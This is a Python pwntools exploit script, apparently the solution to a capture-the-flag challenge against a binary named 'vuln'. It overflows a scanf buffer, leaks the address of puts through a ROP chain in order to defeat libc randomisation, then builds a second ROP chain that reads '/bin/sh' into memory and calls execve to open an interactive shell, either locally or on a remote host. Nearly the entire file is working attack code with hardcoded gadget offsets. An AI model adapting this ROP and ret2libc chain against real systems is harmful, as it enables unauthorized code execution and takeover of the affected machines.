#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'./'
# Stripped:   No

# pad a byte string to 8 bytes
def pad_to_8(bstr):
    return bstr.ljust(8, b'\0')

RIP_DIST = 136

BSS_BUFF  = 0x601100
PUTS_GOT  = 0x601018
PUTS_PLT  = 0x400540
MAIN_LOOP = 0x4008a0

VULN_RET     = 0x000000000040052e
VULN_POP_RDI = 0x0000000000400913

LIBC_POP_RDX = 0x0000000000001b96
LIBC_POP_RSI = 0x0000000000023e8a
LIBC_SYSCALL = 0x00000000000d29d5

log.info("""this challenge has a scanf that'll read way past a buffer, but gadgets are limited in the elf and we need to leak
a libc address. there's no PIE, so a puts@plt(puts@got) is trivial without another leak, then we just fix stack alignment and
jump back into the while(true) loop to keep the program going. second stage exploitation after that is a simple rop

buffer overflow -> puts(puts) [libc leak] -> loop back into do_stuff -> buffer overflow -> libc ropchain -> shell""")

io = start()


p = log.progress("Leaking puts address...")
io.sendline(cyclic(RIP_DIST) + 
        p64(VULN_POP_RDI) + p64(PUTS_GOT) +
        p64(PUTS_PLT) + # puts(puts) to leak libc
        p64(VULN_RET) + # realign stack
        p64(MAIN_LOOP)  # prevent crash
        )
io.readline() 
io.readline() # junk lines
puts_libc = u64(pad_to_8(io.readline().strip()))
p.success(f"puts_libc = {hex(puts_libc)}")

libc_base = puts_libc - libc.symbols['puts']
log.success(f"libc_base = {hex(libc_base)}")

log.info("sending second stage shellcode to pop shell...")
# pause() # for debugging
io.sendline(cyclic(RIP_DIST) +
        p64(VULN_POP_RDI) + p64(0) +
        p64(libc_base + LIBC_POP_RSI) + p64(BSS_BUFF) +
        p64(libc_base + LIBC_POP_RDX) + p64(100) +
        p64(libc_base + libc.symbols['read']) + # read(0, BSS_BUFF, 100) <- /bin/sh
        p64(VULN_POP_RDI) + p64(BSS_BUFF) +
        p64(libc_base + LIBC_POP_RSI) + p64(0) +
        p64(libc_base + LIBC_POP_RDX) + p64(0) +
        p64(libc_base + libc.symbols['execve']) # execve(/bin/sh, 0, 0)
        )

io.send('/bin/sh')

io.interactive()

